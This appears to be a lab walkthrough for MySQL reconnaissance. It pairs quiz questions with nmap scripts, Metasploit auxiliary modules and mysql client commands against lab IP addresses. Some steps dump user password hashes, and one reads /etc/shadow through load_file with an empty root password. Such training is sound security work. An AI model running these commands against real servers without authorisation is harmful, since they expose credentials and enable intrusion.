
#
---

# MySQL Recon: Basics

1.  What is the version of MySQL server?
```
nmap [ip] -sV -sC
```
- MySQL 5.5.62-0ubuntu0.14.04.1

3.  What command is used to connect to remote MySQL database?
```
mysql -u [username] -h [ip] -p
```

5.  How many databases are present on the database server?
```
show databases;
```

7.  How many records are present in table “authors”? This table is present inside the “books” database.
```
use books;

select * from authors;
```

9.  Dump the schema of all databases from the server using suitable metasploit module?
```
auxiliary(scanner/mysql/mysql_schemadump) // also provides a .txt file with it;
```

11.  How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
```
auxiliary(scanner/mysql/mysql_writable_dirs)

```

13.  How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
```
auxiliary(scanner/mysql/mysql_file_enum)

```

15.  Find the system password hash for user "root".
```
mysql -u root -h [id]
select load_file('/etc/shadow');
```

17.  How many database users are present on the database server? Lists their names and password hashes.
```
auxiliary(scanner/mysql/mysql_hashdump)
```

19.  Check whether anonymous login is allowed on MySQL Server.
```
mysql -h 192.82.22.3

nmap [ip] -p 3306 --script=mysql-empty-password
```

21.  Check whether “InteractiveClient” capability is supported on the MySQL server.
```
nmap 192.12.132.3 -p 3306 --script=mysql-info
```

23.  Enumerate the users present on MySQL database server using mysql-users nmap script.
```
nmap 192.12.132.3 -p 3306 --script=mysql-users --script-args="mysqluser=root,mysqlpass=''"
```

25.  List all databases stored on the MySQL Server using nmap script.
```
nmap 192.12.132.3 -p 3306 --script=mysql-databases --script-args="mysqluser=root,mysqlpass=''"
```

27.  Find the data directory used by mysql server using nmap script.
```
nmap 192.12.132.3 -p 3306 --script=mysql-variables --script-args="mysqluser=root,mysqlpass=''"
```

29.  Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
```
nmap 192.12.132.3 -p 3306 --script=mysql-audit --script-args="mysql-audit.username=root,mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
```
31.  Dump all user hashes using  nmap script.
```
nmap --script mysql-dump-hashes --script-args='username=root,password=""' -p 3306 192.12.132.3
```
33.  Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
```
nmap --script mysql-query --script-args="query ='select * from books.authors;',username='root',password=''" -p 3306 192.12.132.3
```